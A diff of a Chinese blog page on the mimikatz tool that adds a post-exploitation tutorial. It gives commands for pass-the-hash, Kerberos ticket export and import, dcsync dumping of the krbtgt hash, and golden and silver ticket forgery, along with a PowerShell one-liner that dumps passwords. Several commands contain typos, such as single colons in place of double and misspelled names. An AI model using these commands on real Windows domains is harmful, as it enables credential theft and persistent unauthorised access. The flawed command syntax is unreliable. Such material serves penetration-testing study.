@@ -122,7 +122,7 @@
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwgt2walj30wh0hhmy1.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwi10mj0j30kk099dfw.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwtjmhb7j30hf0eb0tf.jpg">
-<meta property="og:updated_time" content="2018-12-05T08:11:50.337Z">
+<meta property="og:updated_time" content="2018-12-06T13:42:22.766Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="密码提取神器--mimikatz">
 <meta name="twitter:description" content="mimikatz抓取用户密码https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203 mimikatz是由C语言编写的开源小工具，于2014年4月发起。它的功能非常强大，支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证，以及pass-the-hash、pass-the-ticket、buil">
@@ -400,12 +400,24 @@
                 
               
 
-              <time title="创建时间：2018-12-05 14:57:03 / 修改时间：16:11:50" itemprop="dateCreated datePublished" datetime="2018-12-05T14:57:03+08:00">2018-12-05</time>
+              <time title="创建时间：2018-12-05 14:57:03" itemprop="dateCreated datePublished" datetime="2018-12-05T14:57:03+08:00">2018-12-05</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-12-06 21:42:22" itemprop="dateModified" datetime="2018-12-06T21:42:22+08:00">2018-12-06</time>
               
             
           </span>
@@ -495,6 +507,45 @@ sekurlsa::logonpasswords #抓取密码
 <p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p>
 </blockquote>
 <h3 id="使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"><a href="#使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token" class="headerlink" title="使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"></a>使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token</h3><p>以管理员身份运行mimikatz——&gt;使用<code>privilege::debug</code>获取debug权限——&gt;使用<code>token::elevate</code>模仿system用户的令牌——&gt;使用<code>token::list</code>列出令牌——&gt;使用 <code>lsadump::sam</code>来获取sam数据库中的密码——&gt;使用<code>token::revert</code>恢复令牌</p>
+<h2 id="Mimikatz后渗透"><a href="#Mimikatz后渗透" class="headerlink" title="Mimikatz后渗透"></a>Mimikatz后渗透</h2><p>在kerberos认证中，如果需要向某个服务发起认证，首先需要获取到TGT，之后拿着这张TGT去获得ST。微软的kerberos认证支持rc4加密，它会使用服务器的ntlm hash作为加密票据的密钥。那么当获取到ST后，就能尝试暴力破解服务器的密码hash。</p>
+<h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass-The-Hash"></a>Pass-The-Hash</h3><pre><code>sekurlsa::pth /domain:GUOXIANG.com /user:administrator /ntlm 保存的hash
+</code></pre><h3 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h3><p>查看当前用户的ticket</p>
+<pre><code>Kerberos::list
+</code></pre><p>导出当前用户的ticket</p>
+<pre><code>Kerberos::list /export
+</code></pre><p>查看所有ticket</p>
+<pre><code>Sekurlsa::tickets
+</code></pre><p>导出所有ticket</p>
+<pre><code>Sekurlsa::tickets /export
+</code></pre><p>获得需要的票据后，可以在其他机器上导入此票据：</p>
+<pre><code>Kerberos:ptt 票据名
+</code></pre><p>导入不依赖管理员权限，比较方便。假设导入了域管的票据，则我们可以dir域控的c$共享：<code>Dir\\DC\c$</code>来进行测试。</p>
+<p>需要注意的是UNC路径中需要使用主机名DC，而不能使用172.17.1.1这样的ip地址，否则可能会被拒绝访问。</p>
+<h2 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h2><p>黄金票据（golden ticket）是一种为任意用户生成TGT票据的方法。只要获取<strong>kribtgt账户的密码HASH</strong>、<strong>域sid</strong>、<strong>域名</strong>和<strong>域账户</strong>，黄金票据即可离线生成，而且不受TGT生命周期的影响（默认10小时，最多续订7天）</p>
+<h3 id="kribtgt账户的密码HASH"><a href="#kribtgt账户的密码HASH" class="headerlink" title="kribtgt账户的密码HASH"></a>kribtgt账户的密码HASH</h3><p>kribtgt账户的密码hash存储在域控制器上，因此需要获得域管理员权限。</p>
+<p>获取krbtgt的hash：</p>
+<pre><code>lsadump::dcsync /domain:GUOXIANG.com /user:krbtgt
+</code></pre><p>我们可以使用<code>aes256_hmac</code>这一行的hash。</p>
+<h3 id="域sid"><a href="#域sid" class="headerlink" title="域sid"></a>域sid</h3><p>域的sid可以使用工具<strong>psgetsid</strong>获取，也可以在获取域成员shell后使用<code>whoami /user</code>获取。例如域用户sid为<code>S-1-5-21-3187487621-2881332574-933047120-1105</code>，则1105之前的就是域sid</p>
+<h3 id="生成黄金票据"><a href="#生成黄金票据" class="headerlink" title="生成黄金票据"></a>生成黄金票据</h3><p>获取到上述信息后，就可以使用mimikatz的<code>kerberos::golden</code>生成黄金票据</p>
+<pre><code>Kerberos::golden /user：guoxiang /sid:域sid /aes256:krbtgt账户aes256加密的hash /domain:GUOXIANG.com /ticket:golden.kirbi
+</code></pre><p>当需要使用黄金票据的时候，使用mimikatz：</p>
+<pre><code>Kerberos:ptt golden.kribi
+</code></pre><h2 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h2><p>黄金票据伪造的是TGT，而白银票据则伪造ST。</p>
+<p>由于ST针对特定的服务，因此白银票据只能用来<strong>认证特定服务</strong>，而黄金票据则可以用于<strong>认证任何kerberos服务</strong>。</p>
+<p>使用白银票据并不需要和域控通信（使用ST直接和目标服务器通信），而使用黄金票据则需要与域控通信（需要使用伪造的TGT来获取ST）</p>
+<h3 id="生成白银票据"><a href="#生成白银票据" class="headerlink" title="生成白银票据"></a>生成白银票据</h3><p>生成白银票据需要：</p>
+<ul>
+<li>域名</li>
+<li>sid</li>
+<li>用户名：可以是任意用户</li>
+<li>服务名：如cifs、ldap等</li>
+<li>目标计算机账户密码hash（<strong>这里需要win-xxxxxx$这类账户的ntlm hash，否则会导致认证失败</strong>）</li>
+</ul>
+<p>获取到上述信息后：</p>
+<pre><code>kerberos::golden /admin:guoxiang /domain:GUOXIANG.com /id:1105 /sid:S-1-5-21-2236738896-1661306322-1924668396 target:guoxiang.GUOXIANG.com /rc4:35493c328494b75aff81d2ffcf173787 /service:LDAP /ptt
+</code></pre><p>到处白银票据。</p>
+<p>Mimikatz中的<strong>dcsync</strong>通过<strong>drsr  协议</strong>向域控发起复制用户凭证的请求。使用这种方式，无需登录到域控上，只通过网络就能够获取用户的凭证。前面讲解的黄金和白银票据可以实现对域控的持久访问，配合dcsync即可在域成员主机上提取凭证。</p>
 <h2 id="Powershell版的Mimikatz"><a href="#Powershell版的Mimikatz" class="headerlink" title="Powershell版的Mimikatz"></a>Powershell版的Mimikatz</h2><p>一句话执行：</p>
 <pre><code>powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;
 </code></pre><p>无文件执行：</p>
@@ -613,7 +664,7 @@ sekurlsa::logonpasswords #抓取密码
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">24</span>
+                    <span class="site-state-item-count">26</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -656,7 +707,9 @@ sekurlsa::logonpasswords #抓取密码
                     
                       
                     
-                    <span class="site-state-item-count">15</span>
+                      
+                    
+                    <span class="site-state-item-count">16</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -715,7 +768,7 @@ sekurlsa::logonpasswords #抓取密码
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz抓取用户密码"><span class="nav-number">1.</span> <span class="nav-text">mimikatz抓取用户密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz令牌窃取"><span class="nav-number">2.</span> <span class="nav-text">mimikatz令牌窃取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"><span class="nav-number">2.1.</span> <span class="nav-text">使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Powershell版的Mimikatz"><span class="nav-number">3.</span> <span class="nav-text">Powershell版的Mimikatz</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz抓取用户密码"><span class="nav-number">1.</span> <span class="nav-text">mimikatz抓取用户密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz令牌窃取"><span class="nav-number">2.</span> <span class="nav-text">mimikatz令牌窃取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"><span class="nav-number">2.1.</span> <span class="nav-text">使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mimikatz后渗透"><span class="nav-number">3.</span> <span class="nav-text">Mimikatz后渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-The-Hash"><span class="nav-number">3.1.</span> <span class="nav-text">Pass-The-Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-The-Ticket"><span class="nav-number">3.2.</span> <span class="nav-text">Pass-The-Ticket</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Golden-Ticket"><span class="nav-number">4.</span> <span class="nav-text">Golden Ticket</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#kribtgt账户的密码HASH"><span class="nav-number">4.1.</span> <span class="nav-text">kribtgt账户的密码HASH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域sid"><span class="nav-number">4.2.</span> <span class="nav-text">域sid</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成黄金票据"><span class="nav-number">4.3.</span> <span class="nav-text">生成黄金票据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Silver-Ticket"><span class="nav-number">5.</span> <span class="nav-text">Silver Ticket</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#生成白银票据"><span class="nav-number">5.1.</span> <span class="nav-text">生成白银票据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Powershell版的Mimikatz"><span class="nav-number">6.</span> <span class="nav-text">Powershell版的Mimikatz</span></a></li></ol></div>
             
 
           </div>
